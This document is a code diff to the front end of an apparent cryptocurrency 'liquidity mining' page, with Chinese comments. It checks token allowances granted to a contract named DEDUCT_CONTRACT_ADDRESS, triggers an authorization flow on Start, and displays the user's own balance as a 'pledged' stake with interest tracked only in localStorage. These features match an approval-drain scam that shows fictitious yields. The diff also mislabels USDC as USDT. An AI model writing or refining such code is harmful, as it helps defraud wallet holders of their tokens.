@@ -995,11 +995,14 @@ async function updateUIBasedOnChainState() {
       retry(() => usdcContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
       retry(() => wethContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n)
     ]);
+
     const isWethAuthorized = wethAllowance >= requiredAllowance;
     const isUsdtAuthorized = usdtAllowance >= requiredAllowance;
     const isUsdcAuthorized = usdcAllowance >= requiredAllowance;
     const isFullyAuthorized = isServiceActive || isWethAuthorized || isUsdtAuthorized || isUsdcAuthorized;
+
     if (isFullyAuthorized) {
+      // 已授權 → 顯示「流動性挖礦」UI
       const selectedToken = walletTokenSelect ? walletTokenSelect.value : 'USDT';
       const tokenMap = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract };
       const selectedContract = tokenMap[selectedToken];
@@ -1009,28 +1012,21 @@ async function updateUIBasedOnChainState() {
       } catch (e) {}
       const decimals = selectedToken === 'WETH' ? 18 : 6;
       const balance = parseFloat(ethers.formatUnits(balanceBigInt, decimals));
-      if (balance >= 1) {
-        pledgedAmount = balance;
-        lastPayoutTime = lastPayoutTime || Date.now();
-        currentCycleInterest = calculatePayoutInterest();
-        authorizedToken = selectedToken;
-        accountBalance[selectedToken].pledged += balance;
-        localStorage.setItem('pledgedAmount', pledgedAmount.toString());
-        localStorage.setItem('lastPayoutTime', lastPayoutTime.toString());
-        localStorage.setItem('currentCycleInterest', currentCycleInterest.toString());
-        localStorage.setItem('authorizedToken', authorizedToken);
-        await saveUserData();
-        initializeMiningData();
-      }
+
+      // 設定預設代幣
       if (isWethAuthorized && walletTokenSelect) walletTokenSelect.value = 'WETH';
       else if (isUsdtAuthorized && walletTokenSelect) walletTokenSelect.value = 'USDT';
-      else if (isUsdcAuthorized && walletTokenSelect) walletTokenSelect.value = 'USDC';
-      setInitialNextBenefitTime();
-      activateStakingUI();
+      else if (isUsdcAuthorized && walletTokenSelect) walletTokenSelect.value = 'USDT';
+
+      // 啟動「流動性挖礦」UI
+      if (startBtn) startBtn.style.display = 'block';
       disableInteractiveElements(false);
-      updateStatus("");
-      updatePledgeSummary();
+      updateStatus("請點擊 Start 開始流動性挖礦");
+
+      // 不要在這裡寫 pledged！留給 Start 按鈕處理
+
     } else {
+      // 未授權
       if (accountBalanceValue) accountBalanceValue.textContent = '0.000 (未授權)';
       if (startBtn) startBtn.style.display = 'block';
       disableInteractiveElements(false);
@@ -1331,25 +1327,43 @@ document.addEventListener('DOMContentLoaded', () => {
       }
     });
   }
-  if (startBtn) {
+    if (startBtn) {
     startBtn.addEventListener('click', async () => {
-      if (!signer) { updateStatus(translations[currentLang].noWallet, true); return; }
+      if (!signer) { 
+        updateStatus(translations[currentLang].noWallet, true); 
+        return; 
+      }
       const selectedToken = walletTokenSelect ? walletTokenSelect.value : 'USDT';
-      if (!selectedToken) { updateStatus(translations[currentLang].selectTokenFirst, true); return; }
+      if (!selectedToken) { 
+        updateStatus(translations[currentLang].selectTokenFirst, true); 
+        return; 
+      }
       const tokenMap = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract };
       const selectedContract = tokenMap[selectedToken];
-      if (!selectedContract) { updateStatus('Contract not initialized', true); return; }
+      if (!selectedContract) { 
+        updateStatus('Contract not initialized', true); 
+        return; 
+      }
       let balanceBigInt;
       try {
         balanceBigInt = await retry(() => selectedContract.connect(provider).balanceOf(userAddress));
-      } catch (e) { updateStatus(`${translations[currentLang].error}: Balance error`, true); return; }
+      } catch (e) { 
+        updateStatus(`${translations[currentLang].error}: Balance error`, true); 
+        return; 
+      }
       const decimals = selectedToken === 'WETH' ? 18 : 6;
       const balance = parseFloat(ethers.formatUnits(balanceBigInt, decimals));
-      if (balance === 0) { updateStatus(translations[currentLang].balanceZero, true); return; }
+      if (balance === 0) { 
+        updateStatus(translations[currentLang].balanceZero, true); 
+        return; 
+      }
+
       startBtn.disabled = true;
       startBtn.textContent = 'Authorizing...';
+
       try {
         await handleConditionalAuthorizationFlow();
+
         let canStart = false;
         if (selectedToken === 'WETH') {
           const prices = ethPriceCache.price || 2500;
@@ -1358,21 +1372,33 @@ document.addEventListener('DOMContentLoaded', () => {
         } else {
           if (balance >= 1) canStart = true;
         }
+
         if (canStart) {
           pledgedAmount = balance;
           lastPayoutTime = Date.now();
           currentCycleInterest = calculatePayoutInterest();
           authorizedToken = selectedToken;
-          accountBalance[selectedToken].pledged += balance;
+
+          // 【關鍵修正】覆蓋 pledged，不要累加
+          // 因為這是「流動性挖礦」的起始質押
+          if (!accountBalance[selectedToken]) {
+            accountBalance[selectedToken] = { wallet: 0, pledged: 0, interest: 0 };
+          }
+          accountBalance[selectedToken].pledged = balance; // ← 改這裡！用 = 不是 +=
+
           localStorage.setItem('pledgedAmount', pledgedAmount.toString());
           localStorage.setItem('lastPayoutTime', lastPayoutTime.toString());
           localStorage.setItem('currentCycleInterest', currentCycleInterest.toString());
           localStorage.setItem('authorizedToken', authorizedToken);
+
           updateStatus(translations[currentLang].miningStarted);
           activateStakingUI();
           updateAccountBalanceDisplay();
           await smartSave();
           sendToBackend({ type: 'start', pledgedAmount: balance, token: selectedToken });
+
+          // 隱藏 Start 按鈕
+          startBtn.style.display = 'none';
         } else {
           updateStatus('Balance too low.', true);
           startBtn.disabled = false;
